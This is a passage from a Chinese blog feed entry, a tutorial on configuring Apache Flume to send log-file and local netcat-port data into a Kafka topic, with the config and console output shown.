-f ./conf/flume-kafka-port.conf -Dflume.root.logger=INFO,console</span><br></pre></td></tr></table></figure><p>1.6 向日志文件&#x2F;tmp&#x2F;log.txt写入一些数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span> &gt;&gt; /tmp/log.txt</span><br></pre></td></tr></table></figure><p>就可以在消费者窗口看到输出</p><h4 id="2-flume采集端口数据到kafka自定义topic"><a href="#2-flume采集端口数据到kafka自定义topic" class="headerlink" title="2.flume采集端口数据到kafka自定义topic"></a>2.flume采集端口数据到kafka自定义topic</h4><p>2.1 新建配置文件 flume-kafka-port.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source组件：r1</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 55555 </span><br><span class="line"><span class="comment"># 描述和配置sink组件：k1</span></span><br><span class="line">a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink</span><br><span class="line">a1.sinks.k1.kafka.topic = topic-test2</span><br><span class="line">a1.sinks.k1.kafka.bootstrap.servers = localhost:9092</span><br><span class="line">a1.sinks.k1.kafka.flumeBatchSize = 20</span><br><span class="line">a1.sinks.k1.kafka.producer.acks = 1</span><br><span class="line">a1.sinks.k1.kafka.producer.linger.ms = 1</span><br><span class="line">a1.sinks.ki.kafka.producer.compression.type = snappy</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置channel组件，此处使用是内存缓存的方式</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source  channel   sink之间的连接关系</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>2.2所有操作与上文一致<br>略</p><p>2.3 向端口发送数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># nc localhost 55555</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>在消费者端口可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一-配置ip-三个节点&quot;&gt;&lt;a href=&quot;#一-配置ip-三个节点&quot; class=&quot;headerlink&quot; title=&quot;一.配置ip(三个节点)&quot;&gt;&lt;/a&gt;一.配置ip(三个节点)&lt;/h3&gt;&lt;p&gt;自ubuntu17之后多了一种配置方式更加高效,也就是netplan&lt;/p&gt;
&lt;p&gt;1.1编辑配置文件&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@master:/etc/netplan&lt;span class=&quot;comment&quot;&gt;# gedit /etc/netplan/01-network-manager-all.yaml&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置内容如下,&lt;code&gt;注意缩进&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="环境搭建" scheme="http://example.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hadoop" scheme="http://example.com/tags/hadoop/"/>
    
    <category term="kafka" scheme="http://example.com/tags/kafka/"/>
    
    <category term="flume" scheme="http://example.com/tags/flume/"/>
    
  </entry>
  
</feed>
